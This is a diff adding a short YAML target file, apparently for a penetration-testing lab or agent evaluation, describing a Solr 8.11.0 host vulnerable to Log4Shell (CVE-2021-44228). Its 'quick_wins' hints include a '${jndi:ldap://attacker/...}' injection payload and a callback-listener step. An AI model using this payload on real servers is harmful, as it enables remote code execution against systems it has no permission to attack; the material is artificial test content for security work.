@@ -1,0 +1,21 @@
+target:
+  name: "log4j-log4shell"
+  ip: "${TARGET_IP}"
+  platform: "linux"
+
+services:
+  - port: 8983
+    protocol: "tcp"
+    service: "http"
+    product: "Apache Solr"
+    version: "8.11.0"
+    vulnerabilities:
+      - cve: "CVE-2021-44228"
+        name: "Log4Shell"
+        description: "Apache Log4j2 JNDI injection via crafted log message parameters"
+        severity: "critical"
+        cvss: 10.0
+    quick_wins:
+      - "Test JNDI injection in Solr query parameters (q, facet, etc.)"
+      - "Use ${jndi:ldap://attacker/...} payload in HTTP headers and params"
+      - "Set up LDAP/RMI callback listener for JNDI exploitation"
